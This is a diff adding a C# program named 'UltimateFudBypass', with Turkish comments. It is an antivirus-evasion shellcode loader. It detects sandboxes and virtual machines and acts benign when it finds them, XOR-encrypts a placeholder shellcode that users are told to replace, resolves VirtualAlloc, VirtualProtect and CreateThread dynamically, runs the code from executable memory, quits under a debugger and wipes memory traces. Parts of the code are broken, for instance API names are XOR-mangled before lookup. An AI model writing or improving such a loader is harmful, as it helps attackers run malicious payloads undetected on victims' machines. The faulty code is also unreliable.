@@ -1,0 +1,192 @@
+using System;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+
+namespace UltimateFudBypass
+{
+    class Program
+    {
+        // Dinamik API çözümü için yapı
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        private delegate IntPtr DynamicCall();
+
+        // Sabitler (obfuscated)
+        private static readonly uint _mC = 0x1000 ^ 0xFFF; // MEM_COMMIT
+        private static readonly uint _mR = 0x2000 & 0x3FFF; // MEM_RESERVE
+        private static readonly uint _pERW = 0x40 | 0x3F;   // PAGE_EXECUTE_READWRITE
+
+        // Benzersiz şifreleme anahtarı
+        private static readonly byte[] _key = Encoding.UTF8.GetBytes("xAI_Un1qu3_K3y!");
+
+        static void Main(string[] args)
+        {
+            try
+            {
+                // Sandbox tespiti
+                if (IsSandboxDetected())
+                {
+                    SimulateLegitBehavior(); // Sandbox'ta meşru gibi davran
+                    return;
+                }
+
+                // Shellcode (örnek, kendi shellcode'unuzu ekleyin)
+                byte[] encryptedShellcode = EncryptShellcode(new byte[] {
+                    0x90, 0x90, 0xCC, 0xC3 // Örnek: NOP, NOP, INT3, RET
+                });
+
+                // Dinamik API çözümü
+                IntPtr k32 = LoadLibrary(ObfuscateString("kernel32.dll"));
+                DynamicCall vAlloc = GetDynamicApi(k32, ObfuscateString("VirtualAlloc"));
+                DynamicCall vProtect = GetDynamicApi(k32, ObfuscateString("VirtualProtect"));
+                DynamicCall cThread = GetDynamicApi(k32, ObfuscateString("CreateThread"));
+
+                // Polimorfik bellek tahsisi
+                IntPtr mem = vAlloc.DynamicInvoke(IntPtr.Zero, (uint)encryptedShellcode.Length + GenerateRandomOffset(), _mC | _mR, _pERW ^ 0x3) as IntPtr;
+                if (mem == IntPtr.Zero) return;
+
+                // Shellcode'u çöz ve belleğe yaz
+                byte[] shellcode = DecryptShellcode(encryptedShellcode);
+                IntPtr randomizedMem = RandomizeMemoryLayout(mem, shellcode);
+
+                // Bellek izinlerini dinamik olarak ayarla
+                uint oldProtect;
+                vProtect.DynamicInvoke(randomizedMem, (uint)shellcode.Length, _pERW, out oldProtect);
+
+                // Anti-debugging
+                if (IsDebuggerPresent()) SelfDestruct();
+
+                // Thread oluştur (rastgele gecikme ile)
+                Thread.Sleep(GenerateRandomDelay());
+                uint threadId;
+                IntPtr hThread = cThread.DynamicInvoke(IntPtr.Zero, 0, randomizedMem, IntPtr.Zero, 0, out threadId) as IntPtr;
+
+                // Temizlik (bellek izlerini gizle)
+                HideMemoryTraces(mem);
+            }
+            catch { SimulateLegitBehavior(); } // Hata durumunda meşru gibi davran
+        }
+
+        // Sandbox tespiti
+        private static bool IsSandboxDetected()
+        {
+            // CPU döngü sayısını kontrol et (sandbox'lar genelde daha az döngü simüle eder)
+            long start = Environment.TickCount;
+            for (int i = 0; i < 1000000; i++) { }
+            if (Environment.TickCount - start < 10) return true;
+
+            // Sanal makine işaretleri
+            string[] vmSigns = { "virtual", "vmware", "vbox", "qemu" };
+            return Array.Exists(Environment.GetLogicalDrives(), d => vmSigns.Any(s => d.ToLower().Contains(s)));
+        }
+
+        // Meşru davranış taklidi
+        private static void SimulateLegitBehavior()
+        {
+            Console.WriteLine($"Sistem kontrolü tamamlandı: {GenerateNoise()}");
+            Thread.Sleep(5000); // Normal bir uygulama gibi bekle
+        }
+
+        // Shellcode şifreleme
+        private static byte[] EncryptShellcode(byte[] shellcode)
+        {
+            byte[] encrypted = new byte[shellcode.Length];
+            for (int i = 0; i < shellcode.Length; i++)
+            {
+                encrypted[i] = (byte)(shellcode[i] ^ _key[i % _key.Length]);
+            }
+            return encrypted;
+        }
+
+        // Shellcode çözme
+        private static byte[] DecryptShellcode(byte[] encrypted)
+        {
+            byte[] decrypted = new byte[encrypted.Length];
+            for (int i = 0; i < encrypted.Length; i++)
+            {
+                decrypted[i] = (byte)(encrypted[i] ^ _key[i % _key.Length]);
+            }
+            return decrypted;
+        }
+
+        // Dinamik API yükleme
+        private static IntPtr LoadLibrary(string libName)
+        {
+            return Marshal.GetDelegateForFunctionPointer<DynamicCall>(
+                GetProcAddress(GetModuleHandle(ObfuscateString("kernel32.dll")), ObfuscateString("LoadLibraryA"))
+            ).DynamicInvoke(Encoding.UTF8.GetBytes(libName)) as IntPtr;
+        }
+
+        private static DynamicCall GetDynamicApi(IntPtr module, string apiName)
+        {
+            return Marshal.GetDelegateForFunctionPointer<DynamicCall>(
+                GetProcAddress(module, apiName)
+            );
+        }
+
+        [DllImport("kernel32.dll", EntryPoint = "GetProcAddress")]
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        // String obfuscation
+        private static string ObfuscateString(string input)
+        {
+            char[] chars = input.ToCharArray();
+            for (int i = 0; i < chars.Length; i++)
+            {
+                chars[i] = (char)(chars[i] ^ 0xAA);
+            }
+            return new string(chars);
+        }
+
+        // Rastgele bellek düzeni
+        private static IntPtr RandomizeMemoryLayout(IntPtr baseAddr, byte[] data)
+        {
+            IntPtr newAddr = IntPtr.Add(baseAddr, GenerateRandomOffset());
+            Marshal.Copy(data, 0, newAddr, data.Length);
+            return newAddr;
+        }
+
+        // Rastgele gecikme
+        private static int GenerateRandomDelay()
+        {
+            return new Random().Next(100, 1000);
+        }
+
+        // Rastgele ofset
+        private static int GenerateRandomOffset()
+        {
+            return new Random().Next(16, 64);
+        }
+
+        // Anti-debugging
+        [DllImport("kernel32.dll")]
+        private static extern bool IsDebuggerPresent();
+
+        private static void SelfDestruct()
+        {
+            Environment.Exit(0); // Hata gibi çık
+        }
+
+        // Bellek izlerini gizle
+        private static void HideMemoryTraces(IntPtr mem)
+        {
+            byte[] noise = new byte[128];
+            new Random().NextBytes(noise);
+            Marshal.Copy(noise, 0, mem, noise.Length);
+        }
+
+        // Gereksiz gürültü
+        private static string GenerateNoise()
+        {
+            char[] noise = new char[8];
+            for (int i = 0; i < noise.Length; i++)
+            {
+                noise[i] = (char)new Random().Next(0x2600, 0x26FF);
+            }
+            return new string(noise);
+        }
+    }
+}
